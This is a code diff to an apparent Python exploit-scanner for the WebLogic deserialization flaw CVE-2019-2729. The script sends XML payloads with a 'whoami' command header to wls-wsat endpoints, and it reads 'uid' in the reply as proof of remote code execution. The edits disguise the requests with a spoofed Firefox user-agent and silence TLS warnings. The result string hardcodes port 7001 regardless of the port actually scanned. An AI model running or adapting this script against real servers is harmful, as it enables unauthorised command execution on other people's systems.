@@ -15,7 +15,7 @@ import time
 import requests
 
 VUL=['CVE-2019-2729']
-headers = {'user-agent': 'ceshi/0.0.1', 'content-type': 'text/xml', 'cmd': 'whoami'}
+headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:49.0) Gecko/20100101 Firefox/49.0', 'content-type': 'text/xml', 'cmd': 'whoami'}
 
 
 path1 = '/wls-wsat/CoordinatorPortType'
@@ -3545,16 +3545,17 @@ payload2 = '''
 
 def run(ip,port,index):
     try:
+        requests.packages.urllib3.disable_warnings()
         r1 = requests.post('http://' + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3,verify=False)
         time.sleep(1)
         r2 = requests.post('http://' + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3,verify=False)
         time.sleep(1)
         r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico',verify=False)
         if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
-           print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2019-2729)\n\t'+Vcolors.ENDC)
-           a = ip+":"+port+":检测存在JAVA deserialization漏洞(CVE-2019-2729)"
-           return a
+            print(Vcolors.RED+ ip+'\t检测JAVA deserialization漏洞(CVE-2019-2729)\n\t'+Vcolors.ENDC)
+            a = ip+":7001:检测存在JAVA deserialization漏洞(CVE-2019-2729)"
+            return a
         else:
-           pass
+            pass
     except:
-        pass
+         pass
